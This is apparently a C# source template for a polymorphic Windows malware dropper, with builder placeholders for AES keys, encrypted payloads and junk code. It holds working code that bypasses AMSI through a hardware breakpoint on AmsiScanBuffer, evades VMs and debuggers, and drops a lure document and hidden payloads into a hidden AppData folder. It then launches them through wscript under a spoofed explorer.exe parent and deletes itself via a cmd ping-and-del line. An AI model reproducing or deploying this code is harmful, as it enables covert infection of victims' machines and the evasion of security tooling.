using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

// NativeAOT avoids generic Reflection and embedded resources.
// We use direct byte arrays and base64 encoded strings injected at compile time.

namespace [[N_SPACE]]
{
    public class [[N_CLASS]]
    {
        // Polymorphic AES Config
        static byte[] k = new byte[] { [[AES_KEY]] };
        static byte[] v = new byte[] { [[AES_IV]] };

        // File Names
        static string lN = "[[LURE_NAME]]";
        static string p1N = "[[P1_NAME]]";
        static string p2N = "[[P2_NAME]]";

        // Payloads dynamically inserted as Base64 by CompilerHelper
        static string eL_b64 = "[[B64_LURE]]";
        static string eP1_b64 = "[[B64_P1]]";
        static string eP2_b64 = "[[B64_P2]]";

        // WinAPI Structures for PPID Spoofing
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // WinAPI for Hardware Breakpoints (VEH)
        public delegate long PVECTORED_EXCEPTION_HANDLER(IntPtr ExceptionInfo);

        [DllImport("kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, PVECTORED_EXCEPTION_HANDLER Handler);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll")]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll")]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        // WinAPI for PPID Spoofing
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NO_WINDOW = 0x08000000;

        // HWBP Logic (AMSI Bypass)
        static IntPtr amsiAddr = IntPtr.Zero;
        static PVECTORED_EXCEPTION_HANDLER vehHandler;
        
        static long Handler(IntPtr ExceptionInfo)
        {
            // ExceptionInfo -> EXCEPTION_POINTERS struct
            // Simplify via Marshal:
            long exceptionCode = Marshal.ReadInt32(Marshal.ReadIntPtr(ExceptionInfo));
            if (exceptionCode == 0x80000004) // EXCEPTION_SINGLE_STEP
            {
                IntPtr contextRecord = Marshal.ReadIntPtr(ExceptionInfo, IntPtr.Size);
                // Check if RIP == amsiAddr
                long rip = Marshal.ReadInt64(contextRecord, (Environment.Is64BitProcess ? 0xF8 : 0xB8)); // RIP offset in CONTEXT
                if (rip == amsiAddr.ToInt64())
                {
                    // Set RAX to 0x80070057 (AMSI_RESULT_CLEAN)
                    Marshal.WriteInt64(contextRecord, (Environment.Is64BitProcess ? 0x78 : 0xB0), 0x80070057);
                    
                    // Increment RIP by 3 bytes to skip the call setup, or just emulate ret. 
                    // Emulating 'ret' instruction (pop rip):
                    long rsp = Marshal.ReadInt64(contextRecord, (Environment.Is64BitProcess ? 0x98 : 0xC4));
                    long retAddr = Marshal.ReadInt64(new IntPtr(rsp));
                    Marshal.WriteInt64(contextRecord, (Environment.Is64BitProcess ? 0xF8 : 0xB8), retAddr);
                    Marshal.WriteInt64(contextRecord, (Environment.Is64BitProcess ? 0x98 : 0xC4), rsp + 8);

                    // Clear DR0
                    Marshal.WriteInt64(contextRecord, (Environment.Is64BitProcess ? 0x38 : 0x04), 0); // DR0
                    
                    return -1; // EXCEPTION_CONTINUE_EXECUTION
                }
            }
            return 0; // EXCEPTION_CONTINUE_SEARCH
        }

        static void SetupHWBP()
        {
            try {
                IntPtr amsiDll = [[M_GETF]]("amsi.dll", "AmsiScanBuffer");
                if (amsiDll != IntPtr.Zero)
                {
                    amsiAddr = amsiDll;
                    vehHandler = new PVECTORED_EXCEPTION_HANDLER(Handler);
                    AddVectoredExceptionHandler(1, vehHandler);

                    // Context Setup simplified for C# (allocate CONTEXT buffer)
                    int contextSize = Environment.Is64BitProcess ? 1232 : 716;
                    IntPtr pContext = Marshal.AllocHGlobal(contextSize);
                    
                    // Initialize CONTEXT structure with CONTEXT_DEBUG_REGISTERS (0x10010L)
                    for (int i = 0; i < contextSize; i++) Marshal.WriteByte(pContext, i, 0);
                    Marshal.WriteInt32(pContext, Environment.Is64BitProcess ? 0x30 : 0x00, 0x10010); 
                    
                    IntPtr hThread = GetCurrentThread();
                    if (GetThreadContext(hThread, pContext))
                    {
                        // Set DR0 to amsiAddr
                        Marshal.WriteInt64(pContext, Environment.Is64BitProcess ? 0x38 : 0x04, amsiAddr.ToInt64());
                        
                        // Set DR7 to enable DR0 (Local exact breakpoint)
                        long dr7 = Marshal.ReadInt64(pContext, Environment.Is64BitProcess ? 0x70 : 0x1C);
                        dr7 = (dr7 & ~(0xF0000L)) | 0x1; // Enable G0/L0
                        Marshal.WriteInt64(pContext, Environment.Is64BitProcess ? 0x70 : 0x1C, dr7);

                        SetThreadContext(hThread, pContext);
                    }
                    Marshal.FreeHGlobal(pContext);
                }
            } catch { }
        }

        // Generic API Resolver Native AOT Safe
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32", CharSet = CharSet.Auto)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        static IntPtr [[M_GETF]](string lib, string func) {
            IntPtr hModule = GetModuleHandle(lib);
            if (hModule == IntPtr.Zero) hModule = LoadLibrary(lib);
            return GetProcAddress(hModule, func);
        }

        static void SpoofProcess(string targetObj, string args, bool showWindow)
        {
            // Spawn Process under Explorer.exe
            int parentPid = 0;
            Process[] procs = Process.GetProcessesByName("explorer");
            if (procs.Length > 0) parentPid = procs[0].Id;
            else return;

            IntPtr hParent = OpenProcess(0x001F0FFF, false, parentPid); // PROCESS_ALL_ACCESS
            if (hParent == IntPtr.Zero) return;

            STARTUPINFOEX siex = new STARTUPINFOEX();
            siex.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEX>();
            siex.StartupInfo.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
            siex.StartupInfo.wShowWindow = showWindow ? (short)1 : (short)0; // 1 = SW_NORMAL, 0 = SW_HIDE

            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            siex.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, ref lpSize);

            IntPtr parentHandlePtr = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(parentHandlePtr, hParent);

            UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)0x00020000, parentHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            uint creationFlags = EXTENDED_STARTUPINFO_PRESENT;
            if (!showWindow) creationFlags |= CREATE_NO_WINDOW;

            bool result = CreateProcess(null, targetObj + " " + args, IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, null, ref siex, out pi);

            Marshal.FreeHGlobal(siex.lpAttributeList);
            Marshal.FreeHGlobal(parentHandlePtr);
        }

        public static void Main()
        {
            if ([[OPT_VM]] && CheckVM()) return;
            if ([[OPT_AMSI]]) SetupHWBP();

            try {
                string hD = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "[[RND_DIR]]");
                if(!Directory.Exists(hD)) {
                    Directory.CreateDirectory(hD);
                    File.SetAttributes(hD, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);
                }

                string lP = Path.Combine(hD, lN);
                string p1P = Path.Combine(hD, p1N);
                string p2P = Path.Combine(hD, p2N);

                byte[] lB = Dec(Convert.FromBase64String(eL_b64));
                if (lB.Length > 0) { 
                    File.WriteAllBytes(lP, lB); 
                    // Open Document using spoofed process (Explorer handles documents) visibly
                    SpoofProcess("C:\\Windows\\explorer.exe", "\"" + lP + "\"", true); 
                }

                File.WriteAllBytes(p1P, Dec(Convert.FromBase64String(eP1_b64)));
                File.WriteAllBytes(p2P, Dec(Convert.FromBase64String(eP2_b64)));

                SpoofProcess("C:\\Windows\\System32\\wscript.exe", "\"" + p2P + "\"", false);

                if ([[OPT_SELF_DEL]]) {
                    string p = Process.GetCurrentProcess().MainModule.FileName;
                    SpoofProcess("C:\\Windows\\System32\\cmd.exe", "/c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + p + "\"", false);
                }
            } catch { }
        }

        static byte[] Dec(byte[] t)
        {
            if (t.Length == 0) return t;
            using (Aes a = Aes.Create()) {
                a.Key = k; a.IV = v; a.Padding = PaddingMode.PKCS7;
                using (MemoryStream md = new MemoryStream(t))
                using (CryptoStream cd = new CryptoStream(md, a.CreateDecryptor(), CryptoStreamMode.Read))
                using (MemoryStream mp = new MemoryStream()) {
                    cd.CopyTo(mp); return mp.ToArray();
                }
            }
        }

        static bool CheckVM() {
            try {
                if (Environment.ProcessorCount < 2) return true;
                if (Debugger.IsAttached) return true;
                DriveInfo d = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (d.TotalSize < (90L * 1024 * 1024 * 1024)) return true;
                string[] sB = { @"C:\windows\System32\Drivers\Vmmouse.sys", @"C:\windows\System32\Drivers\Vboxguest.sys" };
                foreach (string s in sB) if (File.Exists(s)) return true;
            } catch { }
            return false;
        }

        [[JUNK_CODE]]
    }
}
